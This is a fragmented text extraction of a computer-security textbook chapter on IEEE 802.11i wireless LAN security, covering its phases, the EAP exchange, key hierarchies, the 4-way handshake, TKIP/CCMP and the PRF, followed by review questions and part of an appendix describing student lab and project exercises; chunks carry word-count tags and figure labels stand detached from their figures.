sumably observable action to connect a station to a wired LAN.
	
2.	 Similarly, in order to receive a transmission from a station that is part of a
[Word Count: 73]

wired LAN, the receiving station also must be attached to the wired LAN.
[Word Count: 13]

748    Chapter 24 / Wireless Network Security
[Word Count: 7]

On the other hand, with a wireless LAN, any station within radio range can 
receive. Thus, a wired LAN provides a degree of privacy, limiting reception of 
data to stations connected to the LAN.
[Word Count: 34]

The 802.11i RSN security specification defines the following services:
[Word Count: 9]

• Authentication: A protocol is used to define an exchange between a user and an
[Word Count: 15]

AS (authentication server) that provides mutual authentication and generates 
temporary keys to be used between the client and the AP over the wireless link.
 
• Access control1: This function enforces the use of the authentication function,
[Word Count: 36]

routes the messages properly, and facilitates key exchange. It can work with a 
variety of authentication protocols.
 
• Privacy with message integrity: MAC-level data (e.g., an LLC PDU) are
[Word Count: 29]

­encrypted along with a message integrity code that ensures that the data have 
not been altered.
[Word Count: 16]

Figure 24.6a indicates the security protocols used to support these services, 
while Figure 24.6b lists the cryptographic algorithms used for these services.
[Word Count: 22]

The operation of an IEEE 802.11i RSN can be broken down into five distinct 
phases. The exact nature of the phases will depend on the configuration and the end 
points of the communication. Possibilities include (see Figure 24.5):
[Word Count: 38]

1.	 Two wireless stations in the same BSS communicating via the access point for
[Word Count: 14]

that BSS.
	
2.	 Two wireless stations (STAs) in the same ad hoc IBSS communicating directly
[Word Count: 15]

1In this context, we are discussing access control as a security function. This is a different function than 
medium access control, as described in Section 24.2. Unfortunately, the literature and the standards use 
the term access control in both contexts.
[Word Count: 40]

24.4 / IEEE 802.11i Wireless LAN Security   749
[Word Count: 8]

Extensible
Authentication
Protocol (EAP)
[Word Count: 4]

Conﬁdentialiy, Data
Origin Authentication
[Word Count: 4]

CBC-MAC = Cipher Block  Block Chaining Message Authentication Code (MAC)
CCM 
= Counter Mode with Cipher Block Chaining Message Authentication Code 
CCMP 
= Counter Mode with Cipher Block Chaining MAC Protocol
TKIP 
= Temporal Key Integrity Protocol
[Word Count: 37]

3.	 Two wireless stations in different BSSs communicating via their respective
[Word Count: 11]

APs across a distribution system.
	
4.	 A wireless station communicating with an end station on a wired network via
[Word Count: 19]

IEEE 802.11i security is concerned only with secure communication between 
the STA and its AP. In case 1 in the preceding list, secure communication is assured 
if each STA establishes secure communications with the AP. Case 2 is similar, 
with the AP functionality residing in the STA. For case 3, security is not provided 
across the distribution system at the level of IEEE 802.11, but only within each BSS. 
­End-to-end security (if required) must be provided at a higher layer. Similarly, in 
case 4, security is only provided between the STA and its AP.
[Word Count: 94]

750    Chapter 24 / Wireless Network Security
[Word Count: 7]

Figure 24.7  IEEE 802.11i Phases of Operation
[Word Count: 7]

With these considerations in mind, Figure 24.7 depicts the five phases of 
­operation for an RSN and maps them to the network components involved. One 
new component is the authentication server (AS). The rectangles indicate the 
exchange of sequences of MPDUs. The five phases are defined as follows:
[Word Count: 48]

• Discovery: An AP uses messages called Beacons and Probe Responses to
[Word Count: 12]

­advertise its IEEE 802.11i security policy. The STA uses these to identify an 
AP for a WLAN with which it wishes to communicate. The STA ­associates 
with the AP, which it uses to select the cipher suite and authentication 
­mechanism when the Beacons and Probe Responses present a choice.
 
• Authentication: During this phase, the STA and AS prove their identities to each
[Word Count: 63]

other. The AP blocks nonauthentication traffic between the STA and AS until 
the authentication transaction is successful. The AP does not participate in the 
­authentication transaction other than forwarding traffic between the STA and AS.
 
• Key Management: The AP and the STA perform several operations that
[Word Count: 47]

cause cryptographic keys to be generated and placed on the AP and the STA. 
Frames are exchanged between the AP and STA only.
 
• Protected data transfer: Frames are exchanged between the STA and the end
[Word Count: 36]

station through the AP. As denoted by the shading and the encryption module 
icon, secure data transfer occurs between the STA and the AP only; security is 
not provided end-to-end.
[Word Count: 30]

24.4 / IEEE 802.11i Wireless LAN Security   751
[Word Count: 8]

• Connection termination: The AP and STA exchange frames. During this
[Word Count: 11]

phase, the secure connection is torn down and the connection is restored to 
the original state.
[Word Count: 16]

We now look in more detail at the RSN phases of operation, beginning with the 
­discovery phase, which is illustrated in the upper portion of Figure 24.8. The 
­purpose of this phase is for an STA and an AP to recognize each other, agree on a 
set of security capabilities, and establish an association for future communication 
using those security capabilities.
[Word Count: 61]

to join network
AP sends possible
security parameter
(security capabilties set
per the security policy)
[Word Count: 15]

AP sends the associated
security parameters
[Word Count: 6]

Station sends a
request to perform
 null authentication
[Word Count: 8]

Extensible Authentication Protocol Exchange
[Word Count: 4]

Figure 24.8  IEEE 802.11i Phases of Operation: Capability Discovery, 
Authentication, and Association
[Word Count: 12]

752    Chapter 24 / Wireless Network Security
[Word Count: 7]

Security Capabilities  During this phase, the STA and AP decide on specific 
techniques in the following areas:
[Word Count: 17]

• Confidentiality and MPDU integrity protocols for protecting unicast traffic
[Word Count: 10]

(traffic only between this STA and AP)
 
• Authentication method
 
• Cryptography key management approach
[Word Count: 15]

Confidentiality and integrity protocols for protecting multicast/broadcast traf-
fic are dictated by the AP, since all STAs in a multicast group must use the same 
protocols and ciphers. The specification of a protocol, along with the chosen key 
length (if variable), is known as a cipher suite. The options for the confidentiality 
and integrity cipher suite are:
[Word Count: 57]

• WEP, with either a 40-bit or 104-bit key, which allows backward compatibility
[Word Count: 13]

with older IEEE 802.11 implementations
 
• TKIP
 
• CCMP
 
• Vendor-specific methods
[Word Count: 12]

The other negotiable suite is the authentication and key management (AKM) 
suite, which defines (1) the means by which the AP and STA perform mutual authen-
tication and (2) the means for deriving a root key from which other keys may be 
generated. The possible AKM suites are:
[Word Count: 48]

• IEEE 802.1X
 
• Pre-shared key (no explicit authentication takes place and mutual authentica-
[Word Count: 14]

tion is implied if the STA and AP share a unique secret key)
 
• Vendor-specific methods
[Word Count: 16]

MPDU Exchange  The discovery phase consists of three exchanges:
[Word Count: 9]

• Network and security capability discovery: During this exchange, STAs
[Word Count: 10]

­discover the existence of a network with which to communicate. The AP 
either periodically broadcasts its security capabilities (not shown in figure), 
indicated by RSN IE (Robust Security Network Information Element), in a 
specific channel through the Beacon frame; or responds to a station’s Probe 
Request through a Probe Response frame. A wireless station may discover 
available access points and corresponding security capabilities by either 
­passively ­monitoring the Beacon frames or actively probing every channel.
 
• Open system authentication: The purpose of this frame sequence, which
[Word Count: 86]

­provides no security, is simply to maintain backward compatibility with the 
IEEE 802.11 state machine, as implemented in existing IEEE 802.11 ­hardware. 
In essence, the two devices (STA and AP) simply exchange identifiers.
 
• Association: The purpose of this stage is to agree on a set of security ­capabilities
[Word Count: 49]

to be used. The STA then sends an Association Request frame to the AP. In this 
frame, the STA specifies one set of matching capabilities (one authentication
[Word Count: 27]

and key management suite, one pairwise cipher suite, and one group-key  
cipher suite) from among those advertised by the AP. If there is no match 
in capabilities between the AP and the STA, the AP refuses the Association 
Request. The STA blocks it too, in case it has associated with a rogue AP or 
someone is inserting frames illicitly on its channel. As shown in Figure 24.8, 
the IEEE 802.1X controlled ports are blocked, and no user traffic goes beyond 
the AP. The concept of blocked ports is explained subsequently.
[Word Count: 90]

As was mentioned, the authentication phase enables mutual authentication between 
an STA and an authentication server located in the DS. Authentication is designed 
to allow only authorized stations to use the network and to provide the STA with 
assurance that it is communicating with a legitimate network.
[Word Count: 47]

Until the AS authenticates a supplicant (using an authentication protocol), 
the authenticator only passes control and authentication messages between the 
­supplicant and the AS; the 802.1X control channel is unblocked, but the 802.11 data 
channel is blocked. Once a supplicant is authenticated and keys are provided, the 
authenticator can forward data from the supplicant, subject to predefined access 
control limitations for the supplicant to the network. Under these circumstances, 
the data channel is unblocked.
[Word Count: 74]

The 802.1X framework, with an upper-layer authentication protocol, fits nicely 
with a BSS architecture that includes a number of wireless stations and an AP. How-
ever, for an IBSS, there is no AP. For an IBSS, 802.11i provides a more complex 
solution that, in essence, involves pairwise authentication between stations on the 
IBSS.
[Word Count: 53]

24.4 / IEEE 802.11i Wireless LAN Security   753
[Word Count: 8]

754    Chapter 24 / Wireless Network Security
[Word Count: 7]

MPDU Exchange  The lower part of Figure 24.8 shows the MPDU exchange 
dictated by IEEE 802.11 for the authentication phase. We can think of authentication 
phase as consisting of the following three phases.
[Word Count: 33]

• Connect to AS: The STA sends a request to its AP (the one with which it has
[Word Count: 18]

an association) for connection to the AS. The AP acknowledges this request 
and sends an access request to the AS.
 
• EAP exchange: This exchange authenticates the STA and AS to each other.
[Word Count: 33]

A number of alternative exchanges are possible, as explained subsequently.
 
• Secure key delivery: Once authentication is established, the AS generates a mas-
[Word Count: 23]

ter session key (MSK), also known as the Authentication, Authorization, and 
Accounting (AAA) key, and sends it to the STA. As explained ­subsequently, 
all the cryptographic keys needed by the STA for secure ­communication with 
its AP are generated from this MSK. IEEE 802.11i does not prescribe a method 
for secure delivery of the MSK but relies on EAP for this. Whatever method is 
used, it involves the transmission of an MPDU ­containing an encrypted MSK 
from the AS, via the AP, to the AS.
[Word Count: 85]

EAP Exchange  As mentioned, there are a number of possible EAP exchanges 
that can be used during the authentication phase. Typically, the message flow 
between STA and AP employs the EAP over LAN (EAPOL) protocol, and the 
message flow between the AP and AS uses the Remote Authentication Dial In 
User Service (RADIUS) protocol, although other options are available for both 
STA-to-AP and AP-to-AS exchanges. [FRAN07] provides the following summary 
of the authentication exchange using EAPOL and RADIUS.
[Word Count: 78]

1.	 The EAP exchange begins with the AP issuing an EAP-Request/Identity frame
[Word Count: 12]

24.4 / IEEE 802.11i Wireless LAN Security   755
[Word Count: 8]

2.	 The STA replies with an EAP-Response/Identity frame, which the AP receives
[Word Count: 12]

over the uncontrolled port. The packet is then encapsulated in RADIUS over 
EAP and passed on to the RADIUS server as a RADIUS-Access-Request 
packet.
	
3.	 The AAA server replies with a RADIUS-Access-Challenge packet, which is
[Word Count: 35]

passed on to the STA as an EAP-Request. This request is of the appropriate 
authentication type and contains relevant challenge information.
	
4.	 The STA formulates an EAP-Response message and sends it to the AS.
[Word Count: 34]

The response is translated by the AP into a Radius-Access-Request with 
the response to the challenge as a data field. Steps 3 and 4 may be repeated 
­multiple times, depending on the EAP method in use. For TLS tunneling 
methods, it is common for authentication to require 10–20 round trips.
	
5.	 The AAA server grants access with a Radius-Access-Accept packet. The AP
[Word Count: 62]

issues an EAP-Success frame. (Some protocols require confirmation of the 
EAP success inside the TLS tunnel for authenticity validation.) The controlled 
port is authorized, and the user may begin to access the network.
[Word Count: 33]

Note from Figure 24.8 that the AP controlled port is still blocked to general 
user traffic. Although the authentication is successful, the ports remain blocked 
until the temporal keys are installed in the STA and AP, which occurs during the 
4-way handshake.
[Word Count: 42]

During the key management phase, a variety of cryptographic keys are ­generated 
and distributed to STAs. There are two types of keys: pairwise keys used for 
­communication between an STA and an AP, and group keys used for multicast 
­communication. Figure 24.10, based on [FRAN07], shows the two key hierarchies, 
and Table 24.3 defines the individual keys.
[Word Count: 57]

Pairwise Keys  Pairwise keys are used for communication between a pair 
of devices, typically between an STA and an AP. These keys form a hierarchy 
beginning with a master key from which other keys are derived dynamically and 
used for a limited period of time.
[Word Count: 45]

The pairwise master key (PMK) is derived from the master key. If a PSK is 
used, then the PSK is used as the PMK; if a MSK is used, then the PMK is derived
[Word Count: 34]

756    Chapter 24 / Wireless Network Security
[Word Count: 7]

from the MSK by truncation (if necessary). By the end of the authentication phase, 
marked by the 802.1x EAP Success message (Figure 24.8), both the AP and the 
STA have a copy of their shared PMK.
[Word Count: 36]

The PMK is used to generate the pairwise transient key (PTK), which in fact 
consists of three keys to be used for communication between an STA and AP after 
they have been mutually authenticated. To derive the PTK, the HMAC-SHA-1 
function is applied to the PMK, the MAC addresses of the STA and AP, and nonces
[Word Count: 56]

EAPOL key conﬁrmation key
EAPOL key encryption key
Temporal key
[Word Count: 10]

Possible truncation
PRF (pseudo-random
function) using
HMAC-SHA-1
[Word Count: 7]

Changes based on
policy (disassociation,
[Word Count: 5]

Figure 24.10  IEEE 802.11i Key Hierarchies
[Word Count: 6]

24.4 / IEEE 802.11i Wireless LAN Security   757
[Word Count: 8]

Table 24.3  IEEE 802.11i Keys for Data Confidentiality and Integrity Protocols
[Word Count: 11]

Abbreviation
	
Name
Description/Purpose
Size (bits)
Type
[Word Count: 6]

AAA Key
Authentication, 
Accounting, and 
Authorization Key
[Word Count: 7]

Used to derive the  
PMK. Used with the 
IEEE 802.1X  
authentication and key  
management approach. 
Same as MMSK.
[Word Count: 18]

PSK
Pre-Shared Key
Becomes the PMK in  
pre-shared key  
environments.
[Word Count: 10]

Used with other inputs  
to derive the PTK.
[Word Count: 8]

Used with other inputs  
to derive the GTK.
[Word Count: 8]

Derived from the PMK. 
Comprises the  
EAPOL-KCK,  
EAPOL-KEK, and  
TK and (for TKIP)  
the MIC key.
[Word Count: 16]

TK
Temporal Key
Used with TKIP or  
CCMP to provide  
confidentiality and  
integrity protection for 
unicast user traffic.
[Word Count: 18]

Derived from the  
GMK. Used to provide 
confidentiality and  
integrity protection  
for multicast/ 
broadcast user  
traffic.
[Word Count: 16]

Used by TKIP’s  
Michael MIC to pro-
vide integrity protec-
tion of messages.
[Word Count: 13]

Used to provide  
integrity protection for 
key material distributed 
during the 4-way  
handshake.
[Word Count: 13]

Used to ensure the  
confidentiality of the  
GTK and other  
key material in the 
 4-way handshake.
[Word Count: 16]

758    Chapter 24 / Wireless Network Security
[Word Count: 7]

generated when needed. Using the STA and AP addresses in the generation of the 
PTK provides protection against session hijacking and impersonation; using nonces 
provides additional random keying material.
[Word Count: 29]

The three parts of the PTK are as follows:
[Word Count: 9]

• EAP Over LAN (EAPOL) Key Confirmation Key (EAPOL-KCK): Supports
[Word Count: 10]

the integrity and data origin authenticity of STA-to-AP control frames ­during 
operational setup of an RSN. It also performs an access control ­function: 
­proof-of-possession of the PMK. An entity that possesses the PMK is 
­authorized to use the link.
 
• EAPOL Key Encryption Key (EAPOL-KEK): Protects the confidentiality of
[Word Count: 49]

keys and other data during some RSN association procedures.
 
• Temporal Key (TK): Provides the actual protection for user traffic.
[Word Count: 20]

Pairwise Key Distribution  The upper part of Figure 24.11 shows the MPDU 
exchange for distributing pairwise keys. This exchange is known as the 4-way 
handshake. The STA and AP use this handshake to confirm the existence of 
the PMK, verify the selection of the cipher suite, and derive a fresh PTK for the 
following data session. The four parts of the exchange are as follows:
[Word Count: 65]

• AP S STA: Message includes the MAC address of the AP and a nonce (Anonce)
 
• STA S AP: The STA generates its own nonce (Snonce) and uses both nonces
[Word Count: 31]

and both MAC addresses, plus the PMK, to generate a PTK. The STA then 
sends a message containing its MAC address and Snonce, enabling the AP 
to generate the same PTK. This message includes a message integrity code 
(MIC)2 using HMAC-MD5 or HMAC-SHA-1-128. The key used with the 
MIC is KCK.
[Word Count: 51]

• AP S STA: The AP is now able to generate the PTK. The AP then sends a
[Word Count: 18]

message to the STA, containing the same information as in the first message, 
but this time including a MIC.
 
• STA S AP: This is merely an acknowledgement message, again protected by
[Word Count: 32]

2While MAC is commonly used in cryptography to refer to a message authentication code, the term MIC 
is used instead in connection with 802.11i because MAC has another standard meaning, medium access 
control, in networking.
[Word Count: 35]

24.4 / IEEE 802.11i Wireless LAN Security   759
[Word Count: 8]

Group Key Distribution  For group key distribution, the AP generates a GTK 
and distributes it to each STA in a multicast group. The two-message exchange with 
each STA consists of the following:
[Word Count: 32]

• AP S STA: This message includes the GTK, encrypted either with RC4 or
[Word Count: 14]

with AES. The key used for encryption is KEK. A MIC value is appended.
 
• STA S AP: The STA acknowledges receipt of the GTK. This message
[Word Count: 27]

Figure 24.11  IEEE 802.11i Phases of Operation: Four-Way Handshake and Group Key Handshake
[Word Count: 13]

Message 1 delivers a nonce to the STA
so that it can generate the PTK.
[Word Count: 15]

Message 1 delivers a new GTK to
the STA. The GTK is encrypted
before it is sent and the entire
message is integrity protected.
[Word Count: 24]

Message 3 demonstrates to the STA that
the authenticator is alive, ensures that the
PTK is fresh (new) and that there is no
man-in-the-middle.
[Word Count: 24]

Message 2 delivers another nonce to the
AP so that it can also generate the
PTK. It demonstrates to the AP that
the STA is alive, ensures that the
PTK is fresh (new) and that there is no
man-in-the-middle.
[Word Count: 39]

The STA decrypts the GTK
and installs it for use.
[Word Count: 10]

Message 2 is delivered to the 
AP. This frame serves only as
an acknowledgment to the AP.
[Word Count: 17]

Message 4 serves as an acknowledgement to
Message 3. It serves no cryptographic
function. This message also ensures the
reliable start of the group key handshake.
[Word Count: 26]

AP’s 802.1X controlled port
 unblocked for unicast trafﬁc
[Word Count: 8]

760    Chapter 24 / Wireless Network Security
[Word Count: 7]

IEEE 802.11i defines two schemes for protecting data transmitted in 802.11 
MPDUs: the Temporal Key Integrity Protocol (TKIP) and the Counter Mode-CBC 
MAC Protocol (CCMP).
[Word Count: 25]

TKIP  TKIP is designed to require only software changes to devices that are 
implemented with the older wireless LAN security approach called Wired 
Equivalent Privacy (WEP). TKIP provides two services:
[Word Count: 30]

• Message integrity: TKIP adds a message integrity code to the 802.11 MAC
[Word Count: 13]

frame after the data field. The MIC is generated by an algorithm, called 
Michael, that computes a 64-bit value using as input the source and ­destination 
MAC address values and the data field, plus key material.
 
• Data confidentiality: Data confidentiality is provided by encrypting the
[Word Count: 46]

The 256-bit TK (Figure 24.10) is employed as follows. Two 64-bit keys are 
used with the Michael message digest algorithm to produce a message integrity 
code. One key is used to protect STA-to-AP messages, and the other key is used to 
­protect AP-to-STA messages. The remaining 128 bits are truncated to generate the 
RC4 key used to encrypt the transmitted data.
[Word Count: 61]

For additional protection, a monotonically increasing TKIP sequence ­counter 
(TSC) is assigned to each frame. The TSC serves two purposes. First, the TSC is 
included with each MPDU and is protected by the MIC to protect against replay 
attacks. Second, the TSC is combined with the session TK to produce a dynamic 
encryption key that changes with each transmitted MPDU, thus making cryptanaly-
sis more difficult.
[Word Count: 66]

CCMP  CCMP is intended for newer IEEE 802.11 devices that are equipped with 
the hardware to support this scheme. As with TKIP, CCMP provides two services:
[Word Count: 26]

• Message integrity: CCMP uses the cipher-block-chaining message
[Word Count: 8]

­authentication code (CBC-MAC), described in Chapter 12.
 
• Data confidentiality: CCMP uses the CTR block cipher mode of operation
[Word Count: 19]

with AES for encryption. CTR is described in Chapter 20.
[Word Count: 10]

The same 128-bit AES key is used for both integrity and confidentiality. 
The scheme uses a 48-bit packet number to construct a nonce to prevent replay 
attacks.
[Word Count: 27]

At a number of places in the IEEE 802.11i scheme, a pseudorandom ­function 
(PRF) is used. For example, it is used to generate nonces, to expand pairwise 
keys, and to generate the GTK. Best security practice dictates that different 
­pseudorandom number streams be used for these different purposes. However, for 
­implementation efficiency we would like to rely on a single pseudorandom number 
generator function.
[Word Count: 64]

24.4 / IEEE 802.11i Wireless LAN Security   761
[Word Count: 8]

The PRF is built on the use of HMAC-SHA-1 to generate a pseudorandom 
bit stream. Recall that HMAC-SHA-1 takes a message (block of data) and a key of 
length at least 160 bits and produces a 160-bit hash value. SHA-1 has the property that 
the change of a single bit of the input produces a new hash value with no apparent 
­connection to the preceding hash value. This property is the basis for pseudorandom 
number generation.
[Word Count: 76]

The IEEE 802.11i PRF takes four parameters as input and produces the desired 
number of random bits. The function is of the form PRF(K, A, B, Len), where
[Word Count: 28]

K = a secret key
A = a text string specific to the application (e.g., nonce generation or pairwise
[Word Count: 19]

key expansion)
B = some data specific to each case
Len = desired number of pseudorandom bits
[Word Count: 17]

For example, for the pairwise transient key for CCMP:
[Word Count: 9]

PTK = PRF(PMK, “Pairwise key expansion”, min(AP-Addr, STA-Addr)||
max (AP-Addr, STA-Addr)||min(Anonce, Snonce)||max(Anonce, Snonce), 384)
[Word Count: 14]

K = PMK
A = the text string “Pairwise key expansion”
B = a sequence of bytes formed by concatenating the two MAC addresses
[Word Count: 24]

Nonce = PRF(Random Number,"Init Counter", MAC || Time, 256)
[Word Count: 9]

Where Time is a measure of the network time known to the nonce generator. 
The group temporal key is generated by:
[Word Count: 21]

GTK = PRF(GMK, "Group key expansion", MAC || Gnonce, 256)
[Word Count: 10]

Figure 24.12 illustrates the function PRF(K, A, B, Len). The parameter K 
serves as the key input to HMAC. The message input consists of four items concate-
nated together: the parameter A, a byte with value 0, the parameter B, and a ­counter i. 
The counter is initialized to 0. The HMAC algorithm is run once, ­producing a 160-bit 
hash value. If more bits are required, HMAC is run again with the same inputs, except 
that i is incremented each time until the necessary number of bits is generated. We 
can express the logic as
[Word Count: 95]

PRF(K, A, B, Len)
R ← null string
for i ← 0 to ((Len + 159)/160 – 1) do
R ← R||HMAC-SHA-1(K, A||0||B||i)
Return Truncate-to-Len(R, Len)
[Word Count: 26]

762    Chapter 24 / Wireless Network Security
[Word Count: 7]

[SOUP12] provides a good overview of mobile device threats and countermeasures. 
[BECH11] is a useful analysis of smartphone security issues.
[Word Count: 20]

The IEEE 802.11 and Wi-Fi specifications are covered in more detail in 
[STAL14b]. [FRAN07] is an excellent, detailed treatment of IEEE 802.11i. 
[CHEN05] provides an overview of IEEE 802.11i.
[Word Count: 29]

Figure 24.12  IEEE 802.11i ­Pseudorandom Function
[Word Count: 6]

BECH11	 Becher, M., et al. “Mobile Security Catching Up? Revealing the Nuts and
[Word Count: 13]

Bolts of the Security of Mobile Devices.” IEEE Symposium on Security and 
Privacy, May 2011.
CHEN05	 Chen, J.; Jiang, M.; and Liu, Y. “Wireless LAN Security and IEEE 802.11i.”
[Word Count: 29]

IEEE Wireless Communications, February 2005.
FRAN07	 Frankel, S.; Eydt, B.; Owens, L.; and Scarfone, K. Establishing Wireless
[Word Count: 17]

Robust Security Networks: A Guide to IEEE 802.11i. NIST Special 
Publication SP 800-97, February 2007.
SOUP12	 Souppaya, M., and Scarfone, K. Guidelines for Managing and Securing
[Word Count: 26]

Mobile Devices in the Enterprise. NIST Special Publication SP 800-124, 
July 2012.
STAL14b	 Stallings, W. Data and Computer Communications, Tenth Edition. Upper
[Word Count: 22]

24.6 / Key Terms, Review Questions, and Problems   763
[Word Count: 9]

24.6	Key Terms, Review Questions, and Problems
[Word Count: 7]

4-way handshake
access point (AP)
basic service set (BSS)
Counter Mode-CBC MAC
[Word Count: 12]

Protocol (CCMP)
distribution system (DS)
extended service set (ESS)
group keys
IEEE 802.1X
IEEE 802.11
IEEE 802.11i
[Word Count: 17]

independent BSS (IBSS)
logical link control (LLC)
medium access control (MAC)
MAC header
MAC protocol data unit
[Word Count: 17]

(MPDU)
MAC service data unit (MSDU)
MAC trailer
message integrity code (MIC)
Michael
pairwise keys
[Word Count: 15]

physical layer
pseudorandom function
Robust Security Network
[Word Count: 7]

­Protocol (TKIP)
Wi-Fi
Wi-Fi Protected Access (WPA) 
Wired Equivalent Privacy
[Word Count: 10]

24.1	
What is the basic building block of an 802.11 WLAN?
	 24.2	
Define an extended service set.
	 24.3	
List and briefly define IEEE 802.11 services.
	 24.4	
Is a distribution system a wireless network?
	 24.5	
How is the concept of an association related to that of mobility?
	 24.6	
What security areas are addressed by IEEE 802.11i?
	 24.7	
Briefly describe the four IEEE 802.11i phases of operation.
	 24.8	
What is the difference between TKIP and CCMP?
[Word Count: 74]

24.1	
In IEEE 802.11, open system authentication simply consists of two communications. 
An authentication is requested by the client, which contains the station ID (typically 
the MAC address). This is followed by an authentication response from the AP/router 
containing a success or failure message. An example of when a failure may occur is if 
the client’s MAC address is explicitly excluded in the AP/router configuration.
[Word Count: 65]

a.	 What are the benefits of this authentication scheme?
b.	 What are the security vulnerabilities of this authentication scheme?
[Word Count: 19]

764    Chapter 24 / Wireless Network Security
[Word Count: 7]

a.	 What are the benefits of this authentication scheme?
b.	 This authentication scheme is incomplete. What is missing and why is this impor-
[Word Count: 23]

tant? Hint: The addition of one or two messages would fix the problem.
c.	 What is a cryptographic weakness of this scheme?
[Word Count: 22]

24.3	
For WEP, data integrity and data confidentiality are achieved using the RC4 stream 
encryption algorithm. The transmitter of an MPDU performs the following steps, 
­referred to as encapsulation:
[Word Count: 29]

1.	 The transmitter selects an initial vector (IV) value.
2.	 The IV value is concatenated with the WEP key shared by transmitter and
[Word Count: 23]

­receiver to form the seed, or key input, to RC4.
3.	 A 32-bit cyclic redundancy check (CRC) is computed over all the bits of the
[Word Count: 25]

MAC data field and appended to the data field. The CRC is a common error-
detection code used in data link control protocols. In this case, the CRC serves 
as a integrity check value (ICV).
4.	 The result of step 3 is encrypted using RC4 to form the ciphertext block.
5.	 The plaintext IV is prepended to the ciphertext block to form the encapsu-
[Word Count: 64]

a.	 Draw a block diagram that illustrates the encapsulation process.
b.	 Describe the steps at the receiver end to recover the plaintext and perform the
[Word Count: 25]

integrity check.
c.	 Draw a block diagram that illustrates part b.
[Word Count: 11]

AP sends challenge message
containting 128-bit random
number
[Word Count: 8]

AP decrypts challenge response.
If match, send authentication
success message
[Word Count: 10]

Many instructors believe that research or implementation projects are crucial to 
the clear understanding of computer security. Without projects, it may be dif-
ficult for students to grasp some of the basic concepts and interactions among 
security functions. Projects reinforce the concepts introduced in the book, give 
the student a greater appreciation of how a cryptographic algorithm or security 
function works, and can motivate students and give them confidence that they 
are capable of not only understanding but implementing the details of a security 
capability.
[Word Count: 85]

In this text, we have tried to present the concepts of computer security as 
clearly as possible and have provided numerous homework problems to reinforce 
those concepts. However, many instructors will wish to supplement this material 
with projects. This appendix provides some guidance in that regard and describes 
support material available in the Instructor’s Resource Center (IRC) for this book, 
accessible from Pearson for instructors. The support material covers 11 types of 
projects and other student exercises:
[Word Count: 77]

• Hacking projects
 
• Laboratory exercise
 
• Security education (SEED) projects
 
• Research projects
 
• Programming projects
 
• Practical security assessments
 
• Firewall projects
 
• Case studies
 
• Reading/report assignments
 
• Writing assignments
 
• Webcasts for teaching computer security
[Word Count: 39]

The aim of this project is to hack into a corporation’s network through a series of 
steps. The corporation is named Extreme In Security Corporation. As the name 
indicates, the corporation has some security holes in it and a clever hacker is able 
to access critical information by hacking into its network. The IRC includes what is
[Word Count: 57]

766    Appendix A / Projects and Other Student Exercises
[Word Count: 9]

needed to set up the Web site. The student’s goal is to capture the secret information  
about the price on the quote the corporation is placing next week to obtain a con-
tract for a governmental project.
[Word Count: 37]

The student should start at the Web site and find his or her way into the 
­network. At each step, if the student succeeds, there are indications as to how to 
proceed on to the next step as well as the grade until that point.
[Word Count: 45]

The project can be attempted in three ways:
[Word Count: 8]

1.	 Without seeking any sort of help
	
2.	 Using some provided hints
	
3.	 Using exact directions
[Word Count: 16]

The IRC includes the files needed for this project:
[Word Count: 9]

1.	 Web Security project named extremeinsecure (extremeinsecure.zip)
	
2.	 Web Hacking exercises (XSS and Script-attacks) covering client-side and server-
[Word Count: 18]

side vulnerability exploitations respectively (webhacking.zip)
	
3.	 Documentation for installation and use for the above (description.doc)
	
4.	 A PowerPoint file describing Web hacking (Web_Security.ppt). This file is
[Word Count: 26]

crucial to understanding how to use the exercises since it clearly explains the 
operation using screen shots.
[Word Count: 17]

This project was designed and implemented by Professor Sreekanth Malladi 
of Dakota State University.
[Word Count: 14]

Professor Sanjay Rao and Ruben Torres of Purdue University have prepared 
a set of laboratory exercises that are part of the IRC. These are implementation 
projects designed to be programmed on Linux but could be adapted for any UNIX 
­environment. These laboratory exercises provide realistic experience in implement-
ing security functions and applications.
[Word Count: 53]

The SEED projects are a set of hands-on exercises, or labs, covering a wide range of 
security topics. They were designed by Professor Wenliang Du of Syracuse University 
for use by other instructors [DU11]. The SEED lab exercises are designed so that 
no dedicated physical laboratory is needed. All SEED labs can be carried out on 
students’ personal computers or in a general computing laboratory. The collection 
consists of three types of lab exercises:
[Word Count: 74]

• Vulnerability and attack labs: These 12 labs cover many common vulnerabili-
[Word Count: 12]

ties and attacks. In each lab, students are given a system (or program) with hid-
den vulnerabilities. Based upon the hints provided, students must find these
[Word Count: 26]

A.3 / Security Education (Seed) Projects   767
[Word Count: 7]

vulnerabilities, and then devise strategies to exploit them. Students also need 
to demonstrate ways to defend against the attacks or comment on the prevail-
ing mitigating methods and their effectiveness.
 
• Exploration labs: The objective of these 9 labs is to enhance students’ learning
[Word Count: 44]

via observation, playing, and exploration, so they can understand what secu-
rity principles feel like in a real system; and to provide students with opportu-
nities to apply security principles in analyzing and evaluating systems.
 
• Design and implementation labs: In security education, students should also be
[Word Count: 47]

given opportunities to apply security principles in designing and implementing 
systems. The challenge is to design meaningful assignments that do not require 
a major commitment of time. The 9 labs in this category meet this requirement.
[Word Count: 36]

Table A.1 maps the 30 lab exercises in the SEED repertoire to the relevant 
chapters in the book, together with an estimate of the number of weeks required for 
the typical student to complete a lab, assuming about 10 hours per week devoted to 
the task.
[Word Count: 46]

Table A.1  Mapping of SEED Labs to Textbook Chapters
[Word Count: 9]

Linux Capability-Based Access Control
1
4, 12
[Word Count: 7]

768    Appendix A / Projects and Other Student Exercises
[Word Count: 9]

A Web page accessible through the Companion Website at williamstallings 
.com/ComputerSecurity (Instructor Resources link) provides links to all the labs, 
­organized by chapter. Each lab includes student instructions, relevant documents, 
and any software needed to perform the lab. In addition, a link is provided for in-
structors to enable them to obtain the instructor manual.
[Word Count: 55]

An effective way of reinforcing basic concepts from the course and for teaching 
students research skills is to assign a research project. Such a project could involve 
a literature search as well as an Internet search of vendor products, research lab 
activities, and standardization efforts. Projects could be assigned to teams or, for 
smaller projects, to individuals. In any case, it is best to require some sort of project 
proposal early in the term, giving the instructor time to evaluate the proposal for 
appropriate topic and ­appropriate level of effort. Student handouts for research 
projects should include:
[Word Count: 97]

• A format for the proposal
 
• A format for the final report
 
• A schedule with intermediate and final deadlines
 
• A list of possible project topics
[Word Count: 28]

The students can select one of the topics listed in the IRC or devise their own 
comparable project. The instructor’s supplement includes a suggested format for the 
proposal and final report as well as a list of possible research topics.
[Word Count: 40]

The following individuals have supplied the research and programming 
projects suggested in the instructor’s supplement: Henning Schulzrinne of ­Columbia 
University; Cetin Kaya Koc of Oregon State University; David M. Balenson of 
Trusted Information Systems and George Washington University; Dan Wallach of 
Rice University; and David Evans of the University of Virginia.
[Word Count: 51]

